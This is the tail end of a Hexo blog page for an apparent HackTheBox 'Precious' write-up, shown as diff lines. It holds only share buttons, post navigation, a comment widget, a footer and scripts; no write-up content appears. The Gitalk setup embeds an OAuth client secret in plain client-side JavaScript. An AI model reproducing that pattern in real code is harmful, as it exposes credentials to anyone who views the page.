+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/11/26/Hackthebox/Easy/Hackthebox-Precious/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Precious - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2022/11/26/Hackthebox/Easy/Hackthebox-Precious/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/11/26/Hackthebox/Easy/Hackthebox-Precious/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2022/12/17/Hackthebox/Easy/Hackthebox-Soccer/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">Soccer - Hackthebox</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2022/10/29/Hackthebox/Easy/Hackthebox-MetaTwo/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">MetaTwo - Hackthebox</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+        var id = location.pathname
+        if (location.pathname.length > 50) {
+          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
+        }
+        const gitalk = new Gitalk({
+          clientID: 'cf0a9809323df14a9168',
+          clientSecret: 'a30d7a21bf6d88b7ad5c1f5d1bfc45881c49b2ed',
+          repo: 'LucifielHack.github.io',
+          owner: 'LucifielHack',
+          admin: ['LucifielHack'],
+          id: id,      // Ensure uniqueness and length less than 50
+          title: document.title.split('|')[0],
+          distractionFreeMode: false  // Facebook-like distraction free mode
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            <!--- 
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>footer.license</span> --->
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>Lucifiel &copy; 2020 - 2023</span>
+            <span>
+                
+                Power by Lucifiel</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/11/26/Hackthebox/Easy/Hackthebox-Precious/&title=《Precious - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/11/26/Hackthebox/Easy/Hackthebox-Precious/&title=《Precious - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/11/26/Hackthebox/Easy/Hackthebox-Precious/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Precious - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2022/11/26/Hackthebox/Easy/Hackthebox-Precious/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/11/26/Hackthebox/Easy/Hackthebox-Precious/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACwklEQVR42u3a0WrjQAwF0Pz/T2dhX7PjXkmjtgvHT4WmzhwXLHGl1yu+3n+vz58/P3P67eluz3/7/rheGxceHh5e6+inKz968ghOn3x+ZM9/9cUjwMPDw1vjTW59OmheAPJ3e35mPDw8vN/AS5rp5+Y4OlDQUuPh4eH9v7znL35GJkEDHh4e3m/mJWFEwu5FBr0HdzlrwcPDw4t5kwHYT/38TfM9PDw8vOJUvTcYm4e570sXHh4e3gavGhBUR2LVN3ZvwPZF8cDDw8O7ypsPtKrtb/4g8m883gcPDw9vgZfcrtoWN6tTvEaQfDseHh7eHi8f3ufv2/xYvaa5UMbw8PDw1ni9L86LSv5azxetohPi4eHhLfN6w6pe71qNiasLDXh4eHjbvGp80DtEfre8JDTDCDw8PLxLvGpT2wtz80WEXpP9qh4ODw8PrzPNL4ys5kOv3nJVzj5GEnh4eHiXeNWGeBKqzhcIyutWeHh4eAu8XqNcjXeri1y9Fvx4Hjw8PLyrvHyslbfFURc/jhiiu+Hh4eEt8PJf5w1xrymfLCtETTkeHh7eAi9pnXsHyoPayUJYM57Aw8PDW+DNX/T54+g10NVgGg8PD2/Cmw+ukuhhUmZ65QEPDw9vj1euGJfKQzW6zePj0ZYEHh4eXsDrrVJVQ9jeU89LwrHJxsPDw1vgJQFutRWuxhm9KLlZlvDw8PDGvOpSVF5CqgdN2vS8aOHh4eHt8eYBQf7injyOyVANDw8P7y7vXbzmbXQ11KgGx3h4eHjbvOq4a95AVw86GZLh4eHh7fF6TfCtKDb/D1TPhoeHh7fNqxaD3ppUtfz0lsCibTI8PDy8b+dVm+bnO1TnVoWSg4eHh/ejvCRmrQ7VJisLUTnBw8PDW+NNwog8qO0tH0yiCjw8PLwNXm8AlocOvXWEapt+eb6Hh4eH9+/P/wHxwJKXrWXcQwAAAABJRU5ErkJggg==" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+
+
+
+
+</body>
+</html>
